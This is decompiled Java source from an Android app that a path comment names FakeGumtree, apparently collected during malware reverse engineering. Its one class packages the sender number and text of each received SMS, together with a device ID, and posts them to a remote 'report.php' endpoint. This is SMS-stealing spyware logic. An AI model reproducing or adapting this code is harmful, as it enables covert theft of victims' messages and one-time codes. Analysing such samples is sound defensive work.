package com.gumsis.mess.api;

import android.content.Context;
import com.gumsis.Realtalk;
import com.gumsis.api.request.HttpRequest;
import com.gumsis.api.request.HttpResponse;
import com.gumsis.api.request.HttpResponseHandler;
import com.gumsis.api.tls.TxtTls;
import com.gumsis.srs.api.responses.StatusResponse;
import org.json.JSONObject;

public class SendReceivedSmsRequest
  extends HttpRequest
{
  private static final String LOG_TAG = "REALTALK REQUEST";
  private static final String PATH = "report.php";
  private HttpResponseHandler<HttpResponse> mResponseHandlerHandler;
  private String message;
  private String number;
  
  public SendReceivedSmsRequest(Context paramContext, String paramString1, String paramString2, HttpResponseHandler<HttpResponse> paramHttpResponseHandler)
  {
    super(paramContext, "report.php", 24);
    this.number = paramString1;
    this.message = paramString2;
    try
    {
      this.data = TxtTls.getBytesUTF8(getHttpParams(paramContext));
      this.mResponseHandlerHandler = paramHttpResponseHandler;
      return;
    }
    catch (Exception paramContext)
    {
      paramContext.printStackTrace();
    }
  }
  
  protected String getHttpParams(Context paramContext)
    throws Exception
  {
    JSONObject localJSONObject1 = new JSONObject();
    JSONObject localJSONObject2 = new JSONObject();
    localJSONObject2.put("report", "sms");
    localJSONObject2.put("id", Realtalk.getPsuedoID(paramContext));
    localJSONObject2.put("number", this.number);
    localJSONObject2.put("message", this.message);
    localJSONObject1.put("1", localJSONObject2);
    return TxtTls.getPostParamsUTF8(localJSONObject1);
  }
  
  public String getUrl()
  {
    return getBaseUrl();
  }
  
  protected void onRequestFailure(int paramInt, String paramString)
  {
    StatusResponse localStatusResponse = new StatusResponse();
    localStatusResponse.parseFailureResponse(paramInt, paramString);
    if (this.mResponseHandlerHandler != null) {
      this.mResponseHandlerHandler.onResponse(this.requestType, localStatusResponse);
    }
  }
  
  protected void onRequestSuccess(JSONObject paramJSONObject)
  {
    StatusResponse localStatusResponse = new StatusResponse();
    localStatusResponse.parseSuccessResponse(paramJSONObject);
    if (this.mResponseHandlerHandler != null) {
      this.mResponseHandlerHandler.onResponse(this.requestType, localStatusResponse);
    }
  }
}


/* Location:              /home/cmd/Programmierung/Android/reverse-engineering/fakegumtree/FakeGumtree-dex2jar.jar!/com/gumsis/mess/api/SendReceivedSmsRequest.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       0.7.1
 */